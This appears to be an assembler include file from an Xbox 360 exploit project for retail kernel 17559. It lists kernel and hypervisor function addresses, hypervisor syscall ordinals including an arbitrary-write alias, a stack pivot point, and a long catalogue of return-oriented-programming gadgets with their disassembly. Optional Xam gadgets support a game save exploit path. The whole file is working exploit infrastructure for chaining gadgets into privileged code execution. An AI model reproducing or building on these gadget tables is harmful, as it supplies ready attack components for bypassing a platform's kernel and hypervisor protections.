

# Specify the kernel version so the build config file knows the kernel addresses have been defined.
.set KRNL_VER,				17559

# Kernel function addresses:
.include "KernelExports_Retail_17559.asm"

# Only include xam functions if we're building the game save exploit.
.ifdef GAME_SAVE_EXPLOIT
.include "Xam_Retail_17559.asm"
.endif

.set MiAllocateMappedMemory,			0x80080D28
.set MiFreeMappedMemory,				0x800817D0

.set ObDissectName,						0x8008C148
.set ObpLookupElementNameInDirectory,	0x8008A348

.set FscInvalidateDevice,						0x8006EB20
.set FscLookupElement,							0x8006EBE8
.set SfcxLookupElementNameInDirectoryRange,		0x800920A8

.set XeKeysReadFile,					0x8010A1B0
.set XeKeysWriteFile,					0x8010A2B0

# Address in KiSwitchToProtectedStack to perform stack pivot:
.set KiSwitchToProtectedStackPivot,		0x80078D6C

# Address of loop entry for XexpTitleHashSectionFind:
.set XexpTitleHashSectionFindLoop,		0x8007DE6C

.set memcmp,							0x80117200	# Can be substituted for XeCryptMemDiff if memcmp is not available (or anything with same signature and behavior) (do NOT use RtlCompareMemory, it doesn't return 0 on matching data)
.set memset,							0x8010D110
.set memcpy,							0x8010CC40
.set strncpy,							0x8010D1B0

# System call functions:
.set HvxKeysExGetKey,					0x80108580
.set HvxKeysExSetKey,					0x80108570
.set HvxEncryptedReserveAllocation,		0x80082CD0
.set HvxEncryptedReleaseAllocation,		0x80082D00
.set HvxEncryptedEncryptAllocation,		0x80082CE0
.set HvxFlushDCacheRange,				0x8007F968
.set HvxFlushSingleTb,					0x8007390C

# System call ordinals:
.set sc_HvxPostOutputExploit,			0x0D
.set sc_HvxFlushUserModeTb,				0x21
.set sc_HvxKeysExecute,					0x42
.set sc_HvxEncryptedReserveAllocation,	0x49
.set sc_HvxEncryptedEncryptAllocation,	0x4A
.set sc_HvxEncryptedReleaseAllocation,	0x4C
.set sc_HvxRevokeUpdate,				0x65

.set sc_HvxArbWriteSyscall,				sc_HvxFlushUserModeTb

# Kernel data addresses:
.set SfcxDeviceExtension,				0x8017CE00

.set MmSystemPfnRegion,					0x80170880
.set MmTitlePfnRegion,					0x80170780

.set FscTitleCacheProcess,				0x801A5620
.set FscSystemCacheProcess,				0x801A56C0

.set BootAnimFilePath,					0x800404B0

.set SfcxDriverObject,					0x80042A50
.set SfcxDeviceExtension,				0x8017CE00

# Boot animation addresses:
.set BootAnimCodePageAddress,			0x98030000

# Boot animation oracle data:
.macro BOOT_ANIM_ORACLE_DATA

	.byte 0x41, 0x9A, 0x00, 0x14, 0x2F, 0x09, 0x00, 0x00, 0x40, 0x9A, 0x00, 0x28, 0x7F, 0x08, 0xF8, 0x40

.endm


###########################################################
# Kernel gadget address.

#	addi	r1, r1, 0xA0
#	b		__restgprlr_24
.set	__restgprlr_24,					0x800631A0		# .fill 0x58, 1, 0x00

#	addi	r1, r1, 0x90
#	b		__restgprlr_25
.set	__restgprlr_25,					0x80061B70		# .fill 0x50, 1, 0x00

#	addi  	r1, r1, 0x90
#	b 		__restgprlr_26
.set	__restgprlr_26,					0x80062578		# .fill	0x58, 1, 0x00

#	addi  	r1, r1, 0x80
#	b 		__restgprlr_27
.set    __restgprlr_27,                 0x80061D50		# .fill 0x50, 1, 0x00

#	addi  	r1, r1, 0x80
#	b 		__restgprlr_28
.set    __restgprlr_28,                 0x8006148C		# .fill 0x58, 1, 0x00

#	addi  	r1, r1, 0x70
#	b 		__restgprlr_29
.set    __restgprlr_29,                 0x800619B4		# .fill 0x50, 1, 0x00

#	addi	r1, r1, 0x70
#	lwz		r12, -0x8(r1)
#	mtlr	r12
#	ld		r30, -0x18(r1)
#	ld		r31, -0x10(r1)
#	blr
.set	__restgprlr_30,					0x80061538		# .fill 0x58, 1, 0x00

#	addi	r1, r1, 0x60
#	lwz		r12, -0x8(r1)
#	mtlr	r12
#	ld		r31, -0x10(r1)
#	blr
.set	__restgprlr_31,					0x800664B0		# .fill	0x50, 1, 0x00

#	stw		r3, 0(r31)
#	addi	r1, r1, 0x60
#	lwz		r12, -0x8(r1)
#	mtlr	r12
#	ld		r31, -0x10(r1)
#	blr
.set	stw_r3,							0x800D986C		# .fill 0x50, 1, 0x00

# 	mr		r3, r31
#	addi	r1, r1, 0x70
#	lwz		r12, -8(r1)
#	mtlr	r12
#	ld		r31, -0x10(r1)
#	blr
.set	mr_r31_to_r3,					0x800661E4		# .fill 0x60, 1, 0x00

#	mr		r11, r31
#	mr		r3, r11
#	addi	r1, r1, 0x70
#	lwz		r12, -8(r1)
#	mtlr	r12
#	ld		r30, -0x18(r1)
#	ld		r31, -0x10(r1)
#	blr
.set    mr_r31_to_r11,                  0x800C8748      # .fill 0x58, 1, 0x00
.set	mr_r11_to_r3,					0x800C874C		# .fill 0x58, 1, 0x00

#	mtctr	r31
#	bctrl
#	addi	r1, r1, 0x60
#	lwz		r12, -8(r1)
#	mtlr	r12
#	ld		r31, -0x10(r1)
#	blr
.set	call_func_dispatch,				0x8007B0AC		# .fill 0x50, 1, 0x00

# BUILD SPECIFIC GADGET!!
#	lwz		r3, 0x28(r31)
#	mr		r4, r30
#	lwz		r11, 0x30(r31)
#	mtctr	r11
#	bctrl
#	b		loc_800F428C
#	addi	r1, r1, 0x80
#	b		__restgprlr_27
.set	stack_pivot_entry,				0x800D27A0		# .fill 0x50, 1, 0x00

# BUILD SPECIFIC GADGET!!
#	mr		r8, r25
#	mr		r7, r26
#	mr		r6, r27
#	mr		r5, r28
#	mr		r4, r29
#	mr		r3, r31
#	mtctr	r11
#	bctrl
.set	call_func_preload,				0x800F68CC
.set	call_func_preload_r4,			call_func_preload + 0x10
.set	call_func_preload_r5,			call_func_preload + 0xC
.set	call_func_preload_r6,			call_func_preload + 8

# Default register values for unused parameters to call_func_preload:
.set	cf_r3_def,						0x31313131
.set	cf_r4_def,						0x29292929
.set	cf_r5_def,						0x28282828
.set	cf_r6_def,						0x27272727
.set	cf_r7_def,						0x26262626
.set	cf_r8_def,						0x25252525

# Offsets for low half of argument registers in CALL_FUNC_LABEL macro:
.set	cf_r3_offset,					0x34
.set	cf_r4_offset,					0x24
.set	cf_r5_offset,					0x1C
.set	cf_r6_offset,					0x14
.set	cf_r7_offset,					0x0C
.set	cf_r8_offset,					0x04

#	lwz		r3, 0x2EE8(r11)
#	add		r10, r3, r4
#	stw		r10, 0x2EE8(r11)
#	blr
.set	load_add_store_r3_r4_on_r11,	0x80129B7C

# BUILD SPECIFIC DISPLACEMENT!!
#	lwz		r3, 0x30(r3)
#	blr
.set	lwz_r3_off_r3,					0x80130F60
.set	lwz_r3_off_r3_disp,				0x30

#	lwz		r11, 0(r3)
#	extrwi	r3, r11, 1,10
#	blr
.set	lwz_r11_off_r3,					0x80131E38

#	stw		r11, 0(r3)
#	blr
.set	stw_r11_on_r3,					0x800C6690

#	mr		r10, r3
#	mr		r3, r10
#	addi	r1, r1, 0x60
#	lwz		r12, -0x8(r1)
#	mtlr	r12
#	blr
.set	mr_r3_to_r10,					0x8012BC00		# .fill 0x58, 1, 0x00

#	stwbrx	r10, 0, r11
#	blr
.set	stwbrx_r10_on_r11,				0x800DBFD4

#	lwz		r9, 0x14(r3)
#	addi	r9, r9, 1
#	stw		r9, 0x14(r3)
#	blr
.set	lwz_r9_off_r3_add_one,			0x80089038

#	slw		r8, r5, r10
#	add		r11, r8, r11
#	addi	r6, r6, -2
#	addi	r10, r10, -1
#	cmpwi	cr6, r6, -2
#	bne		cr6, loc_80162F44
#	mr		r3, r11
#	blr
.set	slw_r5_by_r10_into_r8,			0x80147C54

#	lhz		r11, 8(r3)
#	lhz		r10, 8(r4)
#	cmplw	cr6, r11, r10
#	bge		cr6, loc_8012BEC4
#	li		r3, -1
#	blr
.set	lhz_r11_off_r3,					0x8010B1CC

#	lbz		r3, 0x54(r3)
#	addi	r1, r1, 0x60
#	lwz		r12, -8(r1)
#	mtlr	r12
#	blr
.set	lbz_r3_off_r3,					0x80101CE0		# .fill 0x58, 1, 0x00

#	mr		r5, r30
#	li		r4, 0
#	mtctr	r29
#	bctrl
.set	mr_r30_to_r5,					0x8007C188

#	add		r3, r11, r3
#	blr
.set	add_r3_r11,						0x800B0D4C

#	lwz		r3, 8(r3)
#	blr
.set	lwz_r3_off_r3_plus_8,			0x8008240C

#	subf	r3, r10, r11
#	blr
.set	subf_r10_from_r11,				0x8008A33C

#	li		r11, 0
#	stb		r11, 0(r31)
#	addi	r1, r1, 0x70
#	lwz		r12, -8(r1)
#	mtlr	r12
#	ld		r30, -0x18(r1)
#	ld		r31, -0x10(r1)
#	blr
.set	stb_zero_to_r31,				0x80130640		# .fill 0x58, 1, 0x00

# BUILD SPECIFIC GADGET!!!
#	cmplwi	cr6, r5, 0
#	beq		cr6, loc_8010B064
#		mr		r4, r29
#		mr		r3, r25
#		mtctr	r24
#		bctrl
#
#	li		r3, 0
#	addi	r1, r1, 0xA0
#	b		__restgprlr_24
.set	cmplwi_r5_0,					0x8010B078		# .fill 0x58, 1, 0x00

#   blr
.set	blr_nop,						0x8008A340

# Note: clrlwi instruction differs on debug!!!
#	srw		r11, r10, r11
#	clrlwi	r3, r11, 28
#	blr
.set	srw_r10_by_r11_into_r11,		0x80084830

#	mr		r4, r1
#	mtctr	r10
#	mtlr	r11
#	bctr
.set	mr_r1_to_r4,					0x800762E4

#	stw		r4, 8(r3)
#	blr
.set	stw_r4_on_r3,					0x80131F60


.ifdef GAME_SAVE_EXPLOIT

###########################################################
# Xam gadget address.

#   lwz     r1, 0(r1)
#   lwz     r12, -8(r1)
#   mtlr    r12
#   blr
.set    stack_pivot,                    0x81725378

#   stw     r30, 0(r31)
#   addi    r1, r1, 0x70
#   lwz     r12, -8(r1)
#   mtlr    r12
#   ld      r30, -0x18(r1)
#   ld      r31, -0x10(r1)
#   blr
.set    stw_r30_on_r31,                 0x816FCAAC      # .fill 0x58, 1, 0x00

# BUILD SPECIFIC GADGET!!!
#   slwi    r10, r3, 2
#   addi    r11, r11, 0x3D64
#   lwzx    r3, r10, r11
#   blr
.set    mul_r3_4_lwzx_r11,              0x816D8864
.set    mul_r3_4_lwzx_r11__disp,        0x3D64

# BUILD SPECIFIC GADGET!!!
#   lwz     r11, 0x18(r31)
#   add     r11, r30, r11
#   stw     r11, 0x18(r31)
#   addi    r1, r1, 0x70
#   lwz     r12, -8(r1)
#   mtlr    r12
#   ld      r30, -0x18(r1)
#   ld      r31, -0x10(r1)
#   blr
.set    load_add_store_r11_r30_on_r31,          0x817F7DC8      # .fill 0x58, 1, 0x00
.set    load_add_store_r11_r30_on_r31__disp,    0x18

#   cmplwi  r3, 0
#   li      r3, 0
#   beq     loc_817F031C
#       li      r3, 1
#
#   addi    r1, r1, 0x60
#   lwz     r12, -8(r1)
#   mtlr    r12
#   ld      r31, -0x10(r1)
#   blr
.set    clamp_r3,                       0x817F030C      # .fill 0x50, 1, 0x00

#   lwz     r11, 0(r31)
#   mtctr   r11
#   bctrl
.set    call_ptr_off_r31,                       0x81699DC8

.endif

